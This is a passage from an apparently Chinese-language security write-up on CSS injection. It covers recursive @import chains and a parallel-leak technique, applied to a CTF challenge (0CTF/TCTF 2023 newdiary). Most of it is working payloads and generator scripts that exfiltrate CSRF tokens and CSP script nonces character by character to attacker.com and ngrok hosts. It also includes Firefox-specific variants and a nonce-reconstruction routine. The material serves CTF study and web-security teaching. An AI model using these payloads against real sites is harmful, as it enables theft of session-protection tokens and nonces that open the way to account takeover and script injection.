+&lt;style>
+    head, meta &#123;
+        display: block;
+    &#125;
+    </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>
+      csrfTokenChars<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">char</span> <span class="token operator">=></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+        meta[name="csrf-token"][content^="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>prefix <span class="token operator">+</span> char<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"] &#123;
+            background: url(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>baseUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>prefix <span class="token operator">+</span> char<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)
+        &#125;
+      </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+    <span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">
+&lt;/style>
+  </span><span class="token template-punctuation string">`</span></span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h2 id="7-import-递归导入"><a href="#7-import-递归导入" class="headerlink" title="7. @import 递归导入"></a>7. @import 递归导入</h2><p>完成上述 CSS Injection 通常需要满足以下先决条件：</p>
+<ol>
+<li>CSS 注入需要允许足够长的有效负载</li>
+<li>能够构建页面以触发新生成的有效负载的 CSS 重新评估</li>
+<li>能够使用外部托管的图像（可能被 CSP 阻止）</li>
+</ol>
+<p>这意味着如果注入不允许足够大小的有效负载或者页面无法构建，则上述的技术可能不适用。</p>
+<p>在这种情况下需要一种让浏览器无需重新加载iframe 或额外的用户交互，即可重新评估多个 CSS 有效负载，而且还需要能绕过可以注入的有效负载的长度限制的方法。</p>
+<p>仅使用标签来利用这一点似乎不太可能，因此考虑有趣的CSS功能：<code>@import</code></p>
+<h3 id="7-1-import-用法"><a href="#7-1-import-用法" class="headerlink" title="7.1 @import 用法"></a>7.1 @import 用法</h3><p>许多编程语言都能够从其他源文件导入代码，CSS 也不例外。<br>虽然许多人可能只知道 <code>&lt;link href=&quot;...&quot; rel=&quot;stylesheet&quot;&gt;</code> ，<br>但 CSS 本身实际上有一种方法可以使用名为 <code>@import</code> 的规则，<br>执行类似 <code>&lt;link&gt;</code>（但不同）类型的样式表包含。</p>
+<h3 id="7-2-递归导入的先决条件"><a href="#7-2-递归导入的先决条件" class="headerlink" title="7.2 递归导入的先决条件"></a>7.2 递归导入的先决条件</h3><p>要完成使用 @import 的递归导入，需要满足以下先决条件：</p>
+<ol>
+<li>在样式标记的开头拥有控制权（HTML 注入通常拥有此控制权）</li>
+<li>页面 CSP 没有阻止外部 <code>style-src</code> url 的使用</li>
+</ol>
+<h3 id="7-3-递归导入原理"><a href="#7-3-递归导入原理" class="headerlink" title="7.3 递归导入原理"></a>7.3 递归导入原理</h3><p>我们需要浏览器评估一次恶意 css，使用下一个获得到的<code>token</code>发送出站请求，然后重复。<br>显然，“重复”部分通常是使用全帧重新加载（iframe，或选项卡等等）来完成的。<br>然而，我们实际上并不需要重新加载框架来让浏览器重新评估新的CSS。</p>
+<p>@import 递归导入 使用 3 个简单步骤来欺骗某些浏览器执行多次评估：</p>
+<ol>
+<li>将 <code>@import</code> 规则注入暂存负载</li>
+<li>暂存有效负载用于 <code>@import</code> 开始对恶意有效负载进行长轮询</li>
+<li>有效负载导致浏览器调用 <code>usingbackground-img: url(...)</code> 导致生成下一个长轮询 <code>@import</code> 规则并将其返回给浏览器。</li>
+</ol>
+<p><img src="image-4.png" alt="image-4.png"></p>
+<h3 id="7-4-递归导入示例"><a href="#7-4-递归导入示例" class="headerlink" title="7.4 递归导入示例"></a>7.4 递归导入示例</h3><p>假设 <code>token</code> 长度为 32 个字符</p>
+<h4 id="7-4-1-有效载荷示例"><a href="#7-4-1-有效载荷示例" class="headerlink" title="7.4.1 有效载荷示例"></a>7.4.1 有效载荷示例</h4><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><span class="token atrule"><span class="token rule">@import</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/staging?len=32<span class="token punctuation">)</span></span><span class="token punctuation">;</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre>
+<h4 id="7-4-2-步骤示例"><a href="#7-4-2-步骤示例" class="headerlink" title="7.4.2 步骤示例"></a>7.4.2 步骤示例</h4><pre class="language-markup" data-language="markup"><code class="language-markup">@import url(http://attacker.com/lp?len=0);
+@import url(http://attacker.com/lp?len=1);
+@import url(http://attacker.com/lp?len=2);
+...
+@import url(http://attacker.com/lp?len=31);</code></pre>
+<h4 id="7-4-3-长轮询有效负载（第0位）示例"><a href="#7-4-3-长轮询有效负载（第0位）示例" class="headerlink" title="7.4.3 长轮询有效负载（第0位）示例"></a>7.4.3 长轮询有效负载（第0位）示例</h4><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[name=xsrf][value^=a]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+<span class="token selector">input[name=xsrf][value^=b]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=b<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+<span class="token selector">input[name=xsrf][value^=c]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=c<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+<span class="token selector">...
+input[name=xsrf][value^=Z]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=Z<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre>
+<p>浏览器调用<code>http://attacker.com/exfil?t=&lt;first char of token&gt;</code>后，<br><code>attacker.com</code> 记录 <code>token</code> ，<br>生成下一个长轮询负载，并返回<code>http://attacaker.com/lp?len=1</code>的响应。</p>
+<h4 id="7-4-4-长轮询有效负载（第-1-s-位）示例"><a href="#7-4-4-长轮询有效负载（第-1-s-位）示例" class="headerlink" title="7.4.4 长轮询有效负载（第 1-s 位）示例"></a>7.4.4 长轮询有效负载（第 1-s 位）示例</h4><blockquote>
+<p>在当前状态下 第 0-s-1 个字符 已知</p>
+</blockquote>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[name=xsrf][value^=sa]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=sa<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+<span class="token selector">input[name=xsrf][value^=sb]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=sb<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+<span class="token selector">input[name=xsrf][value^=sc]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=sc<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+<span class="token selector">...
+input[name=xsrf][value^=sZ]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=sZ<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre>
+<p>重复此过程，直到不再有长轮询连接打开。</p>
+<h3 id="7-5-递归导入工具"><a href="#7-5-递归导入工具" class="headerlink" title="7.5 递归导入工具"></a>7.5 递归导入工具</h3><p><a href="https://github.com/d0nutptr/sic">https://github.com/d0nutptr/sic</a></p>
+<h3 id="7-6-注意事项"><a href="#7-6-注意事项" class="headerlink" title="7.6 注意事项"></a>7.6 注意事项</h3><h4 id="7-6-1-请求数量限制问题"><a href="#7-6-1-请求数量限制问题" class="headerlink" title="7.6.1 请求数量限制问题"></a>7.6.1 请求数量限制问题</h4><p>由于浏览器对于同一个 domain 能同时载入的请求数量有限制，<br>如果在注入时出现请求丢失的情况，可以将 background-imageurl 设置为另一个二级域名 (如 a.attacker.com 等)</p>
+<h4 id="7-6-2-Firefox-特殊处理"><a href="#7-6-2-Firefox-特殊处理" class="headerlink" title="7.6.2 Firefox 特殊处理"></a>7.6.2 Firefox 特殊处理</h4><p>在 Firefox 上对于 @import 的处理有些特殊，就算第一个的请求先返回，<br>也不会立刻更新style，要等所有request 都回来才会一起更新。<br>如果 xssbot 使用的是 Firefox ，则需要对 payload 做如下特殊处理：</p>
+<pre class="language-none"><code class="language-none">&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;1)&lt;&#x2F;style&gt;
+&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;2)&lt;&#x2F;style&gt;
+&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;3)&lt;&#x2F;style&gt;
+&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;4)&lt;&#x2F;style&gt;
+&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;5)&lt;&#x2F;style&gt;
+&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;6)&lt;&#x2F;style&gt;
+&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;7)&lt;&#x2F;style&gt;
+&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;8)&lt;&#x2F;style&gt;</code></pre>
+<p>由于 Chrome 也支持以上写法，所以建议使用以上写法来同时支持两种 xssbot</p>
+<h2 id="8-并行泄露组合"><a href="#8-并行泄露组合" class="headerlink" title="8. 并行泄露组合"></a>8. 并行泄露组合</h2><p>当目标页面通过 CSP 限制了 <code>style-src</code> 时，<br>我们将无法使用 @import递归导入 引入外部样式表<br>但在 Black Hat Asia 2023 中首次提到了关于并行泄露组合的方法<br>在本文中我将以 0CTF&#x2F;TCTF 2023 - newdiary 一题介绍本方法的使用</p>
+<p>本题中的 CSP 策略如下：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span>
+    <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'nonce-&lt;%= nonce %>'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre>
+<p>由于 CSP 中使用了 <code>style-src https://unpkg.com</code>，而 unpkg 仅为 npm 的一个 cdn，<br>因此此处可以认为是允许任何的外部 style，但无法使用 @import 进行递归导入。</p>
+<p>而又因为 CSP 中设置了 Script 的 nonce，仅有携带相应 nonce 属性和值的代码会被执行，<br>因此在本题中我们要使用 CSS Injection 来窃取页面中的 nonce</p>
+<h3 id="8-1-nonce-切割"><a href="#8-1-nonce-切割" class="headerlink" title="8.1 nonce 切割"></a>8.1 nonce 切割</h3><p>我们通过将目标 nonce 切割成多个可能值较少的小块，并不立即泄露出整个 nonce，<br>而是并行泄露所有长为 3 字符的 nonce 连续子串，<br>例如，对于 <code>8c2a19fa-8dcd-44d1-807c-1c65abef0251</code> ，我们可以这样操作：</p>
+<p><img src="image-5.png" alt="image-5.png"></p>
+<h3 id="8-2-解决属性覆盖问题"><a href="#8-2-解决属性覆盖问题" class="headerlink" title="8.2 解决属性覆盖问题"></a>8.2 解决属性覆盖问题</h3><h4 id="8-2-1-利用-cross-fade-函数"><a href="#8-2-1-利用-cross-fade-函数" class="headerlink" title="8.2.1 利用 cross-fade() 函数"></a>8.2.1 利用 cross-fade() 函数</h4><blockquote>
+<p>cross-fade() CSS 函数使用多个图像和百分比的组合作为参数，并返回叠加两个图像后所产生的图像<br>如果省略任何百分比，则将100%减去所有指定的百分比的和，如果结果大于 0%，则结果将平均分配给所有图像。</p>
+</blockquote>
+<p>通过利用 cross-fade() 函数，我们可以避免同一属性被最后一个设定覆盖而导致仅有最后一个设定被请求的问题<br>Payload 如下：</p>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">img[src*="abc"]</span> <span class="token punctuation">&#123;</span> <span class="token property">--abc</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"//attacker.com/abc"</span><span class="token punctuation">)</span></span> <span class="token punctuation">&#125;</span>
+<span class="token selector">img[src*="bcd"]</span> <span class="token punctuation">&#123;</span> <span class="token property">--bcd</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"//attacker.com/bcd"</span><span class="token punctuation">)</span></span> <span class="token punctuation">&#125;</span>
+<span class="token comment">/* ... */</span>
+
+<span class="token selector">img</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">cross-fade</span><span class="token punctuation">(</span>
+        <span class="token function">cross-fade</span><span class="token punctuation">(</span><span class="token function">var</span><span class="token punctuation">(</span>--abc<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">var</span><span class="token punctuation">(</span>--bcd<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span> 50%<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token function">cross-fade</span><span class="token punctuation">(</span><span class="token comment">/* ... */</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        50%
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>生成 Payload 代码如下：</p>
+<pre class="language-none"><code class="language-none">const fs &#x3D; require(&#39;fs&#39;)
+let chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;
+const host &#x3D; &#39;https:&#x2F;&#x2F;ip.ngrok-free.app&#39;
+
+let arr &#x3D; []
+for(let a of chars) &#123;
+    for(let b of chars) &#123;
+        for(let c of chars) &#123;
+            let str &#x3D; a+b+c;
+            arr.push(str)
+        &#125;
+    &#125;
+&#125;
+
+let payload1 &#x3D; &#39;&#39;
+let crossPayload1 &#x3D; &#39;url(&quot;&#x2F;&quot;)&#39;
+let payload2 &#x3D; &#39;&#39;
+let crossPayload2 &#x3D; &#39;url(&quot;&#x2F;&quot;)&#39;
+let payload3 &#x3D; &#39;&#39;
+let crossPayload3 &#x3D; &#39;url(&quot;&#x2F;&quot;)&#39;
+
+const third &#x3D; Math.floor(arr.length &#x2F; 3);
+const arr1 &#x3D; arr.slice(0, third); 
+const arr2 &#x3D; arr.slice(third, 2 * third); 
+const arr3 &#x3D; arr.slice(2 * third); 
+
+for(let str of arr1) &#123;
+    payload1 +&#x3D; &#96;script[nonce*&#x3D;&quot;$&#123;str&#125;&quot;]&#123;--$&#123;str&#125;:url(&quot;$&#123;host&#125;&#x2F;leak?q&#x3D;$&#123;str&#125;&quot;)&#125;\n&#96;
+    crossPayload1 &#x3D; &#96;-webkit-cross-fade($&#123;crossPayload1&#125;, var(--$&#123;str&#125;, none), 50%)&#96;
+&#125;
+
+for(let str of arr2) &#123;
+    payload2 +&#x3D; &#96;script[nonce*&#x3D;&quot;$&#123;str&#125;&quot;]&#123;--$&#123;str&#125;:url(&quot;$&#123;host&#125;&#x2F;leak?q&#x3D;$&#123;str&#125;&quot;)&#125;\n&#96;
+    crossPayload2 &#x3D; &#96;-webkit-cross-fade($&#123;crossPayload2&#125;, var(--$&#123;str&#125;, none), 50%)&#96;
+&#125;
+
+for(let str of arr3) &#123;
+    payload3 +&#x3D; &#96;script[nonce*&#x3D;&quot;$&#123;str&#125;&quot;]&#123;--$&#123;str&#125;:url(&quot;$&#123;host&#125;&#x2F;leak?q&#x3D;$&#123;str&#125;&quot;)&#125;\n&#96;
+    crossPayload3 &#x3D; &#96;-webkit-cross-fade($&#123;crossPayload3&#125;, var(--$&#123;str&#125;, none), 50%)&#96;
+&#125;
+
+payload1 &#x3D; &#96;$&#123;payload1&#125; script&#123;display:block;&#125; script&#123;background-image: $&#123;crossPayload1&#125;&#125;&#96;
+payload2 &#x3D; &#96;$&#123;payload2&#125;script:after&#123;content:&#39;a&#39;;display:block;background-image:$&#123;crossPayload2&#125; &#125;&#96;
+payload3 &#x3D; &#96;$&#123;payload3&#125;script:before&#123;content:&#39;a&#39;;display:block;background-image:$&#123;crossPayload3&#125; &#125;&#96;
+
+fs.writeFileSync(&#39;exp1.css&#39;, payload1, &#39;utf-8&#39;);
+fs.writeFileSync(&#39;exp2.css&#39;, payload2, &#39;utf-8&#39;);
+fs.writeFileSync(&#39;exp3.css&#39;, payload3, &#39;utf-8&#39;);</code></pre>
+<p>这题如果把全部规则都套在同一个元素上，似乎会因为规则太多之类的让 Chrome 直接crash，<br>（不过不影响最终请求的发送）<br>所以需要把把规则分为三份，顺便套在三个不同元素上。</p>
+<h4 id="8-2-2-使用-var-变量法"><a href="#8-2-2-使用-var-变量法" class="headerlink" title="8.2.2 使用 var 变量法"></a>8.2.2 使用 var 变量法</h4><p>Payload：</p>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">:has(script[nonce*="aaa"])</span><span class="token punctuation">&#123;</span><span class="token property">--tosend-aaa</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>...?x=aaa<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+<span class="token selector">:has(script[nonce*="aab"])</span><span class="token punctuation">&#123;</span><span class="token property">--tosend-aab</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>...?x=aab<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+<span class="token selector">:has(script[nonce*="aac"])</span><span class="token punctuation">&#123;</span><span class="token property">--tosend-aac</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>...?x=aac<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+
+<span class="token selector">[...]
+
+input</span><span class="token punctuation">&#123;</span>
+    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--tosend-aaa<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">var</span><span class="token punctuation">(</span>--tosend-aab<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">var</span><span class="token punctuation">(</span>--tosend-aac<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">var</span><span class="token punctuation">(</span>--tosend-aad<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    [...]
+<span class="token punctuation">&#125;</span></code></pre>
+<p>生成 Payload 代码如下：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools
+
+charset <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789"</span>
+
+perms <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">,</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>charset<span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"leak.css"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i<span class="token punctuation">,</span> x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>perms<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f""":has(script[nonce*="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string">"])&#123;&#123;--tosend-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string">: url(https://25de-37-160-34-111.ngrok-free.app/?x=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string">);&#125;&#125;"""</span></span><span class="token punctuation">)</span>
+
+
+    data <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"loading"</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> perms<span class="token punctuation">:</span>
+        data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"var(--tosend-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string">, none),"</span></span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"done"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"writing"</span><span class="token punctuation">)</span>
+    
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
+input&#123;
+background: %s
+&#125;
+"""</span> <span class="token operator">%</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<h3 id="8-3-nonce-复原"><a href="#8-3-nonce-复原" class="headerlink" title="8.3 nonce 复原"></a>8.3 nonce 复原</h3><h4 id="8-3-1-复原原理"><a href="#8-3-1-复原原理" class="headerlink" title="8.3.1 复原原理"></a>8.3.1 复原原理</h4><ol>
+<li>找到开头的长为三个字符的子串（即开头的两个字符匹配不到剩余子串末尾的两个字符的子串）</li>
+<li>通过已知 nonce 部分末尾的两个字符与剩余子串的开头两个字符的匹配来连接 nonce 子串</li>
+<li>重复步骤 2 直到所有子串被连接完毕</li>
+<li>还原整个 nonce</li>
+</ol>
+<h4 id="8-3-2-JavaScript-实现"><a href="#8-3-2-JavaScript-实现" class="headerlink" title="8.3.2 JavaScript 实现"></a>8.3.2 JavaScript 实现</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> ending</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> ending
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ending<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">let</span> isFound <span class="token operator">=</span> <span class="token boolean">false</span>
+      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> j<span class="token punctuation">)</span> <span class="token keyword">continue</span>
+
+        <span class="token keyword">let</span> suffix <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> 
+        <span class="token keyword">let</span> prefix <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix <span class="token operator">===</span> prefix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          isFound <span class="token operator">=</span> <span class="token boolean">true</span>
+          <span class="token keyword">continue</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isFound<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ending:'</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token operator">!==</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Error, please try again'</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> length <span class="token operator">=</span> ending<span class="token punctuation">.</span>length
+    <span class="token keyword">let</span> suffix <span class="token operator">=</span> ending<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> ending<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+    <span class="token keyword">let</span> prefix <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix <span class="token operator">===</span> prefix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      found<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token operator">!==</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> ending<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">return</span> found<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
